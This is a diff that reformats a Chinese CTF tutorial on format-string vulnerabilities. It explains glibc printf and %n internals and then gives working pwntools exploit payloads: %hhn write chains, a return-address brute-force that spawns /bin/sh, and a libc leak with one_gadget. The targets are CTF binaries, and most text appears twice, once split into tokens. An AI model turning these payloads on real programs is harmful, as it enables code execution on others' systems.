@@ -9,88 +9,22 @@
 ## 从源码开始
 
 
-```
-
+```asm
 /* /glibc-2.42/stdio-common/printf.c */
-
 /* Write formatted output to stdout from the format string FORMAT.  */
-
 /* VARARGS1 */
-
 int
-
-__printf
-
-(
-const
-
-char
-
-*
-format
-,
-
-...)
-
+__printf (const char *format, ...)
 {
+  va_list arg;
+  int done;
 
+  va_start (arg, format);
+  done = __vfprintf_internal (stdout, format, arg, 0);
+  va_end (arg);
 
-va_list
-
-arg
-;
-
-
-int
-
-done
-;
-
-
-va_start
-
-(
-arg
-,
-
-format
-);
-
-
-done
-
-=
-
-__vfprintf_internal
-
-(
-stdout
-,
-
-format
-,
-
-arg
-,
-
-0
-);
-
-
-va_end
-
-(
-arg
-);
-
-
-return
-
-done
-;
-
+  return done;
 }
-
 ```
 
 关键点在于11行的`__vfprintf_internal(stdout, format, arg, 0)`
@@ -111,105 +45,21 @@ done
 
 
 ```
-
-func
-(
-int
-
-a1
-,
-
-int
-
-a2
-,
-
-int
-
-a3
-,
-
-int
-
-a4
-,
-int
-
-a5
-,
-int
-
-a6
-,
-int
-
-a7
-,
-int
-
-a8
-)
-
+func(int a1, int a2, int a3, int a4,int a5,int a6,int a7,int a8)
 ```
 
 那么他的传参顺序如下：
 
 
 ```
-
-RDI
-
-←
-
-a1
-
-//
-格式化字符串
-
-RSI
-
-←
-
-a2
-
-RDX
-
-←
-
-a3
-
-RCX
-
-←
-
-a4
-
-R8
-
-←
-
-a5
-
-R9
-
-←
-
-a6
-
-[
-rsp
-]
-
-a8
-
-[
-rsp
-+
-8
-]
-
-a7
-
+RDI ← a1    //格式化字符串
+RSI ← a2
+RDX ← a3
+RCX ← a4
+R8  ← a5
+R9  ← a6
+[rsp] a8
+[rsp+8] a7
 ```
 
 *入栈是`a8、a7`，加入寄存器是`RDI、RSI、RDX、RCX、R8、R9`的正序*
@@ -219,135 +69,22 @@ a7
 接下来看printf函数的核心函数`__vfprintf_internal (stdout, format, arg, 0)`
 
 
-```
-
+```asm
 /* /glibc-2.42/stdio-common/vfprintf-internal.c */
-
-int
-
-vfprintf
-
-(
-FILE
-
-*
-s
-,
-
-const
-
-CHAR_T
-
-*
-format
-,
-
-va_list
-
-ap
-,
-
-unsigned
-
-int
-
-mode_flags
-)
-
-{
-
+int vfprintf (FILE *s, const CHAR_T *format, va_list ap, unsigned int mode_flags) {
 ...
 
-
-if
-
-(
-!
-_IO_need_lock
-
-(
-s
-))
-
-
-{
-
-
-struct
-
-Xprintf
-
-(
-buffer_to_file
-)
-
-wrap
-;
-
-
-Xprintf
-
-(
-buffer_to_file_init
-)
-
-(
-&
-wrap
-,
-
-s
-);
-//初始化缓冲区，关联到流s中
-
-
-Xprintf_buffer
-
-(
-&
-wrap
-.
-base
-,
-
-format
-,
-
-ap
-,
-
-mode_flags
-);
-//格式化内容写入缓冲
-
-
-return
-
-Xprintf
-
-(
-buffer_to_file_done
-)
-
-(
-&
-wrap
-);
-//将缓冲区的内容真正写到文件中
-
-
-}
+  if (!_IO_need_lock (s))
+    {
+      struct Xprintf (buffer_to_file) wrap;
+      Xprintf (buffer_to_file_init) (&wrap, s);//初始化缓冲区，关联到流s中
+      Xprintf_buffer (&wrap.base, format, ap, mode_flags);//格式化内容写入缓冲
+      return Xprintf (buffer_to_file_done) (&wrap);//将缓冲区的内容真正写到文件中
+    }
 
 ...
-
-
-return
-
-done
-;
-
+  return done;
 }
-
 ```
 
 正如注释里，`Xprintf_buffer(&wrap.base, format, ap, mode_flags)`是将格式化字符串写入内存的函数，继续跟进下去，由于代码过长，这里只贴出和`$`有关的以及和`%n`有关的
@@ -355,749 +92,129 @@ done
 {% folding blue::点击查看代码详细 %}
 
 
-```
-
+```python
 void
-
-Xprintf_buffer
-
-(
-struct
-
-Xprintf_buffer
-
-*
-buf
-,
-
-const
-
-CHAR_T
-
-*
-format
-,
-
-va_list
-
-ap
-,
-
-unsigned
-
-int
-
-mode_flags
-)
-
+Xprintf_buffer (struct Xprintf_buffer *buf, const CHAR_T *format, va_list ap, unsigned int mode_flags)
 {
-
-
-...
-
-
-/* 保存原本参数状态 */
-
-
-va_list
-
-ap_save
-;
-
-
-...
-
-
-/* 标记只读格式的错误类型 */
-
-
-enum
-
-readonly_error_type
-
-readonly_format
-
-=
-
-readonly_noerror
-;
-
-
-...
-
+  ...
+  /* 保存原本参数状态 */
+  va_list ap_save;
+  ...
+  /* 标记只读格式的错误类型 */
+  enum readonly_error_type readonly_format = readonly_noerror;
+  ...
 #ifdef COMPILE_WPRINTF
-
-
-/* 查找第一个格式化说明符（宽字符版本） */
-
-
-f
-
-=
-
-lead_str_end
-
-=
-
-__find_specwc
-
-((
-const
-
-UCHAR_T
-
-*
-)
-
-format
-);
-
+  /* 查找第一个格式化说明符（宽字符版本） */
+  f = lead_str_end = __find_specwc ((const UCHAR_T *) format);
 #else
-
-
-/* 查找第一个格式化说明符（多字节版本） */
-
-
-f
-
-=
-
-lead_str_end
-
-=
-
-__find_specmb
-
-((
-const
-
-UCHAR_T
-
-*
-)
-
-format
-);
-
+  /* 查找第一个格式化说明符（多字节版本） */
+  f = lead_str_end = __find_specmb ((const UCHAR_T *) format);
 #endif
-
-
-...
-
-
-/* 如果存在注册的 printf handler，则使用慢路径 */
-
-
-if
-
-(
-__glibc_unlikely
-
-(
-__printf_function_table
-
-!=
-
-NULL
-
-||
-
-__printf_modifier_table
-
-!=
-
-NULL
-
-||
-
-__printf_va_arg_table
-
-!=
-
-NULL
-))
-
-
-goto
-
-do_positional
-;
-
-
-...
-
-
-do
-
-
-{
-
-
-...
-
-
-/* 从参数中获取宽度 */
-
-
-LABEL
-
-(
-width_asterics
-)
-:
-
-
-{
-
-
-const
-
-UCHAR_T
-
-*
-tmp
-;
-
-/* 临时指针 */
-
-
-tmp
-
-=
-
-++
-f
-;
-
-
-if
-
-(
-ISDIGIT
-
-(
-*
-tmp
-))
-
-
-{
-
-
-int
-
-pos
-
-=
-
-read_int
-
-(
-&
-tmp
-);
-
-
-...
-
-
-if
-
-(
-pos
-
-&&
-
-*
-tmp
-
-==
-
-L_
-(
-'$'
-))
-
-
-/* 宽度来自位置参数 */
-
-
-goto
-
-do_positional
-;
-
-
-}
-
-
-width
-
-=
-
-va_arg
-
-(
-ap
-,
-
-int
-);
-
-
-...
-
-
-}
-
-
-JUMP
-
-(
-*
-f
-,
-
-step1_jumps
-);
-
-
-/* 格式字符串中直接给定宽度 */
-
-
-LABEL
-
-(
-width
-)
-:
-
-
-width
-
-=
-
-read_int
-
-(
-&
-f
-);
-
-
-...
-
-
-if
-
-(
-*
-f
-
-==
-
-L_
-(
-'$'
-))
-
-
-/* 哦豁，宽度来自位置参数 */
-
-
-goto
-
-do_positional
-;
-
-
-JUMP
-
-(
-*
-f
-,
-
-step1_jumps
-);
-
-
-LABEL
-
-(
-precision
-)
-:
-
-
-++
-f
-;
-
-
-if
-
-(
-*
-f
-
-==
-
-L_
-(
-'*'
-))
-
-
-{
-
-
-const
-
-UCHAR_T
-
-*
-tmp
-;
-
-/* 临时指针 */
-
-
-tmp
-
-=
-
-++
-f
-;
-
-
-if
-
-(
-ISDIGIT
-
-(
-*
-tmp
-))
-
-
-{
-
-
-int
-
-pos
-
-=
-
-read_int
-
-(
-&
-tmp
-);
-
-
-...
-
-
-if
-
-(
-pos
-
-&&
-
-*
-tmp
-
-==
-
-L_
-(
-'$'
-))
-
-
-/* 精度来自位置参数 */
-
-
-goto
-
-do_positional
-;
-
-
-}
-
-
-prec
-
-=
-
-va_arg
-
-(
-ap
-,
-
-int
-);
-
-
-...
-
-
-}
-
-
-else
-
-if
-
-(
-ISDIGIT
-
-(
-*
-f
-))
-
-
-{
-
-
-prec
-
-=
-
-read_int
-
-(
-&
-f
-);
-
-
-...
-
-
-}
-
-
-else
-
-
-/* 精度缺省时置 0 */
-
-
-prec
-
-=
-
-0
-;
-
-
-JUMP
-
-(
-*
-f
-,
-
-step2_jumps
-);
-
-
-...
-
-
-/* 处理当前格式说明符 */
-
-
-while
-
-(
-1
-)
-
-
-{
-
+  ...
+  /* 如果存在注册的 printf handler，则使用慢路径 */
+  if (__glibc_unlikely (__printf_function_table != NULL || __printf_modifier_table != NULL || __printf_va_arg_table != NULL))
+    goto do_positional;
+  ...
+  do
+    {
+      ...
+      /* 从参数中获取宽度 */
+    LABEL (width_asterics):
+      {
+        const UCHAR_T *tmp; /* 临时指针 */
+        tmp = ++f;
+        if (ISDIGIT (*tmp))
+          {
+            int pos = read_int (&tmp);
+            ...
+            if (pos && *tmp == L_('$'))
+              /* 宽度来自位置参数 */
+              goto do_positional;
+          }
+        width = va_arg (ap, int);
+        ...
+      }
+      JUMP (*f, step1_jumps);
+
+      /* 格式字符串中直接给定宽度 */
+    LABEL (width):
+      width = read_int (&f);
+      ...
+      if (*f == L_('$'))
+        /* 哦豁，宽度来自位置参数 */
+        goto do_positional;
+      JUMP (*f, step1_jumps);
+
+    LABEL (precision):
+      ++f;
+      if (*f == L_('*'))
+        {
+          const UCHAR_T *tmp; /* 临时指针 */
+          tmp = ++f;
+          if (ISDIGIT (*tmp))
+            {
+              int pos = read_int (&tmp);
+              ...
+              if (pos && *tmp == L_('$'))
+                /* 精度来自位置参数 */
+                goto do_positional;
+            }
+          prec = va_arg (ap, int);
+          ...
+        }
+      else if (ISDIGIT (*f))
+        {
+          prec = read_int (&f);
+          ...
+        }
+      else
+        /* 精度缺省时置 0 */
+        prec = 0;
+      JUMP (*f, step2_jumps);
+      ...
+      /* 处理当前格式说明符 */
+      while (1)
+        {
 #define process_arg_int()                    va_arg (ap, int)
-
 #define process_arg_long_int()               va_arg (ap, long int)
-
 #define process_arg_long_long_int()          va_arg (ap, long long int)
-
 #define process_arg_pointer()                va_arg (ap, void *)
-
 #define process_arg_string()                 va_arg (ap, const char *)
-
 #define process_arg_unsigned_int()           va_arg (ap, unsigned int)
-
 #define process_arg_unsigned_long_int()      va_arg (ap, unsigned long int)
-
 #define process_arg_unsigned_long_long_int() va_arg (ap, unsigned long long int)
-
 #define process_arg_wchar_t()                va_arg (ap, wchar_t)
-
 #define process_arg_wstring()                va_arg (ap, const wchar_t *)
-
-#include
-
-"vfprintf-process-arg.c"
-
+#include "vfprintf-process-arg.c"
 #undef process_arg_int
-
 #undef process_arg_long_int
-
 #undef process_arg_long_long_int
-
 #undef process_arg_pointer
-
 #undef process_arg_string
-
 #undef process_arg_unsigned_int
-
 #undef process_arg_unsigned_long_int
-
 #undef process_arg_unsigned_long_long_int
-
 #undef process_arg_wchar_t
-
 #undef process_arg_wstring
+          ...
+          /* 未知或复杂情况 → 回退（包括位置参数情况） */
+        LABEL (form_unknown):
+          if (spec == L_('\0'))
+            { ... }
+          goto do_positional;
+        }
+      ...
+    }
+  while (*f != L_('\0') && !Xprintf_buffer_has_failed (buf));
 
+  return;
 
-...
-
-
-/* 未知或复杂情况 → 回退（包括位置参数情况） */
-
-
-LABEL
-
-(
-form_unknown
-)
-:
-
-
-if
-
-(
-spec
-
-==
-
-L_
-(
-'\0'
-))
-
-
-{
-
-...
-
+  /* 交给位置参数处理函数 */
+do_positional:
+  printf_positional (buf, format, readonly_format, ap, &ap_save,
+                     nspecs_done, lead_str_end, work_buffer,
+                     save_errno, grouping, thousands_sep, mode_flags);
 }
-
-
-goto
-
-do_positional
-;
-
-
-}
-
-
-...
-
-
-}
-
-
-while
-
-(
-*
-f
-
-!=
-
-L_
-(
-'\0'
-)
-
-&&
-
-!
-Xprintf_buffer_has_failed
-
-(
-buf
-));
-
-
-return
-;
-
-
-/* 交给位置参数处理函数 */
-
-do_positional
-:
-
-
-printf_positional
-
-(
-buf
-,
-
-format
-,
-
-readonly_format
-,
-
-ap
-,
-
-&
-ap_save
-,
-
-
-nspecs_done
-,
-
-lead_str_end
-,
-
-work_buffer
-,
-
-
-save_errno
-,
-
-grouping
-,
-
-thousands_sep
-,
-
-mode_flags
-);
-
-}
-
 ```
 
 {% endfolding %}
@@ -1107,265 +224,39 @@ mode_flags
 `%n`相关:
 
 
-```
-
+```python
 /* === %n handler（等价重述版）=== */
-
-LABEL
-(
-form_number
-)
-:
-
-{
-
-
-/* 1) 可选的 Fortify 检查：若启用 PRINTF_FORTIFY，会校验格式串所在区域是否只读。
-
+LABEL(form_number): {
+  /* 1) 可选的 Fortify 检查：若启用 PRINTF_FORTIFY，会校验格式串所在区域是否只读。
      失败则直接致命报错（__libc_fatal("*** %n in writable segment detected ***\n")）。 */
+  if ((mode_flags & PRINTF_FORTIFY) != 0) {
+    if (!readonly_format) {
+      extern int __readonly_area (const void *, size_t);
+      readonly_format = __readonly_area(format, (STR_LEN(format) + 1) * sizeof(CHAR_T));
+    }
+    if (readonly_format < 0)
+      __libc_fatal("*** %n in writable segment detected ***\n");
+  }
 
-
-if
-
-((
-mode_flags
-
-&
-
-PRINTF_FORTIFY
-)
-
-!=
-
-0
-)
-
-{
-
-
-if
-
-(
-!
-readonly_format
-)
-
-{
-
-
-extern
-
-int
-
-__readonly_area
-
-(
-const
-
-void
-
-*
-,
-
-size_t
-);
-
-
-readonly_format
-
-=
-
-__readonly_area
-(
-format
-,
-
-(
-STR_LEN
-(
-format
-)
-
-+
-
-1
-)
-
-*
-
-sizeof
-(
-CHAR_T
-));
-
-
-}
-
-
-if
-
-(
-readonly_format
-
-<
-
-0
-)
-
-
-__libc_fatal
-(
-"*** %n in writable segment detected ***
-\n
-"
-);
-
-
-}
-
-
-/* 2) 取出 %n 对应的“指针参数”。在快速路径是 va_arg(ap, void*)，
-
+  /* 2) 取出 %n 对应的“指针参数”。在快速路径是 va_arg(ap, void*)，
         在位置参数慢路径是从 args_value[...] 取出。*/
+  void *dst = process_arg_pointer();
 
-
-void
-
-*
-dst
-
-=
-
-process_arg_pointer
-();
-
-
-/* 3) 按长度修饰符写回“当前已输出字符数” done：
-
+  /* 3) 按长度修饰符写回“当前已输出字符数” done：
         ll  -> long long*
-
         l   -> long*
-
         hh  -> signed char*
-
         h   -> short*
-
         默认 -> int*
-
   */
+  if (is_longlong)       *(long long *)dst = done;
+  else if (is_long_num)  *(long *)dst       = done;
+  else if (is_char)      *(signed char *)dst= done;
+  else if (!is_short)    *(int *)dst        = done;
+  else                   *(short *)dst      = done;
 
-
-if
-
-(
-is_longlong
-)
-
-*
-(
-long
-
-long
-
-*
-)
-dst
-
-=
-
-done
-;
-
-
-else
-
-if
-
-(
-is_long_num
-)
-
-*
-(
-long
-
-*
-)
-dst
-
-=
-
-done
-;
-
-
-else
-
-if
-
-(
-is_char
-)
-
-*
-(
-signed
-
-char
-
-*
-)
-dst
-=
-
-done
-;
-
-
-else
-
-if
-
-(
-!
-is_short
-)
-
-*
-(
-int
-
-*
-)
-dst
-
-=
-
-done
-;
-
-
-else
-
-*
-(
-short
-
-*
-)
-dst
-
-=
-
-done
-;
-
-
-break
-;
-
+  break;
 }
-
 ```
 
 **总而言之**：`%n` 会把已输出字符数写入用户传入的整型指针（类型由修饰符决定），在\*\*位置参数模式($)下地址固定不可再改，且现代 glibc 会通过 Fortify 检查限制其滥用。\*\*
@@ -1379,74 +270,15 @@ break
 ### **栈上的fmt**
 
 
-```
-
-#include
-
-<stdio.h>
-
-int
-
-main
-()
-
-{
-
-
-char
-
-s
-[
-100
-];
-
-
-int
-
-a
-
-=
-
-1
-,
-
-b
-
-=
-
-0x22222222
-,
-
-c
-
-=
-
--1
-;
-
-
-scanf
-(
-"%s"
-,
-
-s
-);
-
-
-printf
-(
-s
-);
-
-
-return
-
-0
-;
-
+```asm
+#include <stdio.h>
+int main() {
+  char s[100];
+  int a = 1, b = 0x22222222, c = -1;
+  scanf("%s", s);
+  printf(s);
+  return 0;
 }
-
 ```
 
 编译：`gcc -fno-stack-protector -no-pie -o pwn pwn.c`
@@ -1476,159 +308,40 @@ gdb调试：
 控制好偏移，随便写，这里借用一个[师傅](https://www.cnblogs.com/lemon629/p/14026405.html)的演示代码
 
 
-```
+```asm
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
 
-#include
+long long target = 0x1234;
 
-<stdio.h>
-
-#include
-
-<stdlib.h>
-
-#include
-
-<string.h>
-
-#include
-
-<unistd.h>
-
-long
-
-long
-
-target
-
-=
-
-0x1234
-;
-
-int
-
-main
-()
-
+int main()
 {
+    char s[100];
 
-
-char
-
-s
-[
-100
-];
-
-
-while
-(
-1
-)
-
-
-{
-
-
-read
-(
-0
-,
-s
-,
-0x100
-);
-
-
-printf
-(
-s
-);
-
-
-if
-(
-target
-
-==
-
-0x7ffff7ff7123
-)
-
-
-{
-
-
-puts
-(
-"ohhhhhh,you change it to be a big number!"
-);
-
-
-break
-;
-
-
+    while(1)
+    {
+        read(0,s,0x100);
+        printf(s);
+        if(target == 0x7ffff7ff7123)
+        {
+            puts("ohhhhhh,you change it to be a big number!");
+            break;
+        }
+        if(target == 0x2)
+        {
+            puts("ohhhhhh,you change it to be a small number!");
+            break;
+        }
+        else
+        {
+            puts("you are not a pwner!!!");
+        }
+    }
+    puts("this is flag: flag{F0rMat_5tr1ng_BY_64_b1T!!!!}");
+    return 0;
 }
-
-
-if
-(
-target
-
-==
-
-0x2
-)
-
-
-{
-
-
-puts
-(
-"ohhhhhh,you change it to be a small number!"
-);
-
-
-break
-;
-
-
-}
-
-
-else
-
-
-{
-
-
-puts
-(
-"you are not a pwner!!!"
-);
-
-
-}
-
-
-}
-
-
-puts
-(
-"this is flag: flag{F0rMat_5tr1ng_BY_64_b1T!!!!}"
-);
-
-
-return
-
-0
-;
-
-}
-
 ```
 
 编译`gcc -fno-stack-protector -no-pie -o pwn pwn.c`
@@ -1639,226 +352,18 @@ return
 
 
 ```
-
-payload
-
-=
-
-b
-"
-%35c
-%8$hhn"
-.
-ljust
-(
-0x10
-,
-b
-'a'
-)
-
-+
-
-p64
-(
-target
-)
-//
-23
-
-p
-.
-send
-(
-payload
-)
-
-payload
-
-=
-
-b
-"
-%113c
-%8$hhn"
-.
-ljust
-(
-0x10
-,
-b
-'a'
-)
-
-+
-
-p64
-(
-target
-
-+
-
-1
-)
-//
-71
-
-p
-.
-send
-(
-payload
-)
-
-payload
-
-=
-
-b
-"
-%255c
-%8$hhn"
-.
-ljust
-(
-0x10
-,
-b
-'a'
-)
-
-+
-
-p64
-(
-target
-
-+
-
-2
-)
-//
-ff
-
-p
-.
-send
-(
-payload
-)
-
-payload
-
-=
-
-b
-"
-%247c
-%8$hhn"
-.
-ljust
-(
-0x10
-,
-b
-'a'
-)
-
-+
-
-p64
-(
-target
-
-+
-
-3
-)
-//
-f7
-
-p
-.
-send
-(
-payload
-)
-
-payload
-
-=
-
-b
-"
-%255c
-%8$hhn"
-.
-ljust
-(
-0x10
-,
-b
-'a'
-)
-
-+
-
-p64
-(
-target
-
-+
-
-4
-)
-//
-ff
-
-p
-.
-send
-(
-payload
-)
-
-payload
-
-=
-
-b
-"
-%127c
-%8$hhn"
-.
-ljust
-(
-0x10
-,
-b
-'a'
-)
-
-+
-
-p64
-(
-target
-
-+
-
-5
-)
-//
-7
-f
-
-p
-.
-send
-(
-payload
-)
-
+payload = b"%35c%8$hhn".ljust(0x10,b'a') + p64(target)//23
+p.send(payload)
+payload = b"%113c%8$hhn".ljust(0x10,b'a') + p64(target + 1)//71
+p.send(payload)
+payload = b"%255c%8$hhn".ljust(0x10,b'a') + p64(target + 2)//ff
+p.send(payload)
+payload = b"%247c%8$hhn".ljust(0x10,b'a') + p64(target + 3)//f7
+p.send(payload)
+payload = b"%255c%8$hhn".ljust(0x10,b'a') + p64(target + 4)//ff
+p.send(payload)
+payload = b"%127c%8$hhn".ljust(0x10,b'a') + p64(target + 5)//7f
+p.send(payload)
 ```
 
 原本这里的偏移是6，不过由于我们补齐了0x10，所以将地址挤到了8偏移处
@@ -1867,206 +372,24 @@ payload
 
 
 ```
+//offset = 6+0x50/8 = 16
 
-//
-offset
-
-=
-
-6
-+
-0x50
-/
-8
-
-=
-
-16
-
-payload
-
-=
-b
-"
-%35c
-%16$hhn"
-
-//
-35
-=
-0x23
-
-payload
-+=
-b
-"
-%78c
-%17$hhn"
-
-//
-35
-+
-78
-=
-0x71
-
-payload
-+=
-b
-"
-%142c
-%18$hhn"
-
-//
-0x71
-+
-142
-=
-0xff
-
-payload
-+=
-b
-"
-%248c
-%19$hhn"
-
-//
-(
-0xff
-+
-248
+payload =b"%35c%16$hhn"     //35=0x23
+payload+=b"%78c%17$hhn"     //35+78=0x71
+payload+=b"%142c%18$hhn"    //0x71+142=0xff
+payload+=b"%248c%19$hhn"    //(0xff+248)%256=0xf7
+payload+=b"%8c%20$hhn"      //(0xff+248+8)%256=0xff
+payload+="%128c%21$hhn"     //(0xff+248+8+128)%256=0x7f
+payload = payload.ljust(0x50,'a')
+payload +=flat(
+    p64(target),
+    p64(target + 1),
+    p64(target + 2),
+    p64(target + 3),
+    p64(target + 4),
+    p64(target + 5)
 )
-%
-256
-=
-0xf7
-
-payload
-+=
-b
-"
-%8c
-%20$hhn"
-
-//
-(
-0xff
-+
-248
-+
-8
-)
-%
-256
-=
-0xff
-
-payload
-+=
-"
-%128c
-%21$hhn"
-
-//
-(
-0xff
-+
-248
-+
-8
-+
-128
-)
-%
-256
-=
-0x7f
-
-payload
-
-=
-
-payload
-.
-ljust
-(
-0x50
-,
-'a'
-)
-
-payload
-
-+=
-flat
-(
-
-
-p64
-(
-target
-),
-
-
-p64
-(
-target
-
-+
-
-1
-),
-
-
-p64
-(
-target
-
-+
-
-2
-),
-
-
-p64
-(
-target
-
-+
-
-3
-),
-
-
-p64
-(
-target
-
-+
-
-4
-),
-
-
-p64
-(
-target
-
-+
-
-5
-)
-
-)
-
-p
-.
-send
-(
-payload
-)
-
+p.send(payload)
 ```
 
 **小数字写**
@@ -2079,192 +402,27 @@ payload
 挺极限的，啥也没有，一次机会的栈上fmt，静态编译
 
 
-```
-
-int
-
-__fastcall
-
-main
-(
-int
-
-argc
-,
-
-const
-
-char
-
-**
-argv
-,
-
-const
-
-char
-
-**
-envp
-)
-
+```asm
+int __fastcall main(int argc, const char **argv, const char **envp)
 {
+  int v3; // edx
+  int v4; // ecx
+  int v5; // r8d
+  int v6; // r9d
+  char v8[104]; // [rsp+0h] [rbp-70h] BYREF
+  unsigned __int64 v9; // [rsp+68h] [rbp-8h]
 
-
-int
-
-v3
-;
-
-// edx
-
-
-int
-
-v4
-;
-
-// ecx
-
-
-int
-
-v5
-;
-
-// r8d
-
-
-int
-
-v6
-;
-
-// r9d
-
-
-char
-
-v8
-[
-104
-];
-
-// [rsp+0h] [rbp-70h] BYREF
-
-
-unsigned
-
-__int64
-
-v9
-;
-
-// [rsp+68h] [rbp-8h]
-
-
-v9
-
-=
-
-__readfsqword
-(
-0x28u
-);
-
-
-init_0
-(
-argc
-,
-
-argv
-,
-
-envp
-);
-
-
-puts
-(
-"one printf"
-);
-
-
-read
-(
-0L
-L
-,
-
-v8
-,
-
-0x60LL
-);
-
-
-printf
-((
-unsigned
-
-int
-)
-v8
-,
-
-(
-unsigned
-
-int
-)
-v8
-,
-
-v3
-,
-
-v4
-,
-
-v5
-,
-
-v6
-,
-
-v8
-[
-0
-]);
-
-
-return
-
-0
-;
-
+  v9 = __readfsqword(0x28u);
+  init_0(argc, argv, envp);
+  puts("one printf");
+  read(0LL, v8, 0x60LL);
+  printf((unsigned int)v8, (unsigned int)v8, v3, v4, v5, v6, v8[0]);
+  return 0;
 }
-
-__int64
-
-back_door
-()
-
+__int64 back_door()
 {
-
-
-return
-
-system
-((
-__int64
-)
-"/bin/sh"
-);
-
+  return system((__int64)"/bin/sh");
 }
-
 ```
 
 `pinrtf`的栈帧，栈上我们输入可以到达的地方有个栈地址
@@ -2273,170 +431,31 @@ __int64
 
 
 ```
-
-09
-:
-004
-8
-│
--030
-
-0x7fffffffd950
-
-—▸
-
-0x7fffffffdaa8
-
-—▸
-
-0x7fffffffddbf
-
-◂—
-
-'
-/
-home
-/
-pwn
-/
-games
-/
-printf
-/
-pwn_patched
-'
-
+09:0048│-030     0x7fffffffd950 —▸ 0x7fffffffdaa8 —▸ 0x7fffffffddbf ◂— '/home/pwn/games/printf/pwn_patched'
 ```
 
 存放的栈地址是 `0x7fffffffdaa8`，`main`的返回地址是`0x7fffffffd988`，有两字节不同，爆破并修改返回地址为后门函数
 
 
-```
+```python
+def bomb():
+    p.recvuntil(b'one printf')
+    payload = '%{}c'.format(0xbc2).encode()+b'%14$hn'
+    payload = payload.ljust(0x40,b'\x00')+b'\x18\xdb'
+    p.send(payload)
 
-def
+while 1:
+    try:
+        p = start()
+        bomb()
+        p.sendline(b'cat flag')
+        p.recvuntil(b'{')
+        break
+    except:
+        p.close()
+        continue
 
-bomb
-():
-
-
-p
-.
-recvuntil
-(
-b
-'one printf'
-)
-
-
-payload
-
-=
-
-'%
-{}
-c'
-.
-format
-(
-0xbc2
-)
-.
-encode
-()
-+
-b
-'%14$hn'
-
-
-payload
-
-=
-
-payload
-.
-ljust
-(
-0x40
-,
-b
-'
-\x00
-'
-)
-+
-b
-'
-\x18\xdb
-'
-
-
-p
-.
-send
-(
-payload
-)
-
-while
-
-1
-:
-
-
-try
-:
-
-
-p
-
-=
-
-start
-()
-
-
-bomb
-()
-
-
-p
-.
-sendline
-(
-b
-'cat flag'
-)
-
-
-p
-.
-recvuntil
-(
-b
-'{'
-)
-
-
-break
-
-
-except
-:
-
-
-p
-.
-close
-()
-
-
-continue
-
-p
-.
-interactive
-()
-
+p.interactive()
 ```
 
 
@@ -2454,353 +473,54 @@ interactive
 ida反编译如下：
 
 
-```
-
-int
-
-__fastcall
-
-__noreturn
-
-main
-(
-int
-
-argc
-,
-
-const
-
-char
-
-**
-argv
-,
-
-const
-
-char
-
-**
-envp
-)
-
+```asm
+int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 {
+  __int64 savedregs; // [rsp+10h] [rbp+0h] BYREF
 
-
-__int64
-
-savedregs
-;
-
-// [rsp+10h] [rbp+0h] BYREF
-
-
-setbuf
-(
-stdin
-,
-
-0L
-L
-);
-
-
-setbuf
-(
-stdout
-,
-
-0L
-L
-);
-
-
-setbuf
-(
-stderr
-,
-
-0L
-L
-);
-
-
-printf
-(
-"Gift: %x
-\n
-"
-,
-
-(
-unsigned
-
-__int16
-)((
-unsigned
-
-__int16
-)
-&
-savedregs
-
--
-
-0xC
-));
-
-
-read
-(
-0
-,
-
-buf
-,
-
-0x100uLL
-);
-
-
-printf
-(
-buf
-);
-
-
-_exit
-(
-0
-);
-
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  setbuf(stderr, 0LL);
+  printf("Gift: %x\n", (unsigned __int16)((unsigned __int16)&savedregs - 0xC));
+  read(0, buf, 0x100uLL);
+  printf(buf);
+  _exit(0);
 }
-
 ```
 
 检查保护：
 
 
 ```
-
-❯
-
-checksec
-
-pwn
-
-[
-*
-]
-
-'/home/pwn/pwn/litctf/fmt_fmt/pwn'
-
-
-Arch:
-
-amd64-64-little
-
-
-RELRO:
-
-Full
-
-RELRO
-
-
-Stack:
-
-No
-
-canary
-
-found
-
-
-NX:
-
-NX
-
-enabled
-
-
-PIE:
-
-PIE
-
-enabled
-
-
-SHSTK:
-
-Enabled
-
-
-IBT:
-
-Enabled
-
-
-Stripped:
-
-No
-
+❯ checksec pwn
+[*] '/home/pwn/pwn/litctf/fmt_fmt/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
 ```
 
 这一题的打法是通过格式化字符串去编辑一个指针链，从而构造指针链以实现类ROP的效果
 
 
 ```
-
-p
-.
-recvuntil
-(
-b
-'Gift: '
-)
-
-value
-
-=
-
-int
-(
-p
-.
-recv
-(
-4
-),
-16
-)
-
-payload
-=
-b
-'%p'
-*
-9
-
-payload
-+=
-b
-'%'
-+
-str
-((
-value
--
-0xc
-)
--
-90
-)
-.
-encode
-()
-+
-b
-'c%hn'
-
-payload
-+=
-b
-'%'
-+
-str
-(
-0x10023
--
-((
-value
--
-0xc
-)))
-.
-encode
-()
-+
-b
-'c%39$hhn'
-
-payload
-=
-payload
-.
-ljust
-(
-0x100
-,
-b
-'
-\x00
-'
-)
-
-p
-.
-send
-(
-payload
-)
-
-p
-.
-recvuntil
-(
-"0x100"
-)
-
-leak
-
-=
-
-int
-(
-p
-.
-recv
-(
-14
-),
-16
-)
-
-log
-.
-success
-(
-"leak:"
-+
-hex
-(
-leak
-))
-
-libc_base
-=
-leak
--
-0x10e1f2
-
-log
-.
-success
-(
-'libc_base:'
-+
-hex
-(
-libc_base
-))
-
-one_gadget
-=
-libc_base
-+
-0xe3b01
-
+p.recvuntil(b'Gift: ')
+value = int(p.recv(4),16)
+payload=b'%p'*9
+payload+=b'%'+str((value-0xc)-90).encode()+b'c%hn'
+payload+=b'%'+str(0x10023-((value-0xc))).encode()+b'c%39$hhn'
+payload=payload.ljust(0x100,b'\x00')
+p.send(payload)
+p.recvuntil("0x100")
+leak = int(p.recv(14),16)
+log.success("leak:"+hex(leak))
+libc_base=leak-0x10e1f2
+log.success('libc_base:'+hex(libc_base))
+one_gadget=libc_base+0xe3b01
 ```
 
 首先通过`%p`泄露一些内容，再改写偏移为11的指针链的地址，再将其指针链的结尾返回地址改为`printf`函数自身，看下面详解：
@@ -2826,60 +546,9 @@ libc_base
 >
 
 ```
-
-payload
-=
-b
-'%'
-+
-str
-((
-value
--
-0xc
-))
-.
-encode
-()
-+
-b
-'c%11$hn'
-
-payload
-+=
-b
-'%'
-+
-str
-(
-0x100023
--
-((
-value
--
-0xc
-)))
-.
-encode
-()
-+
-b
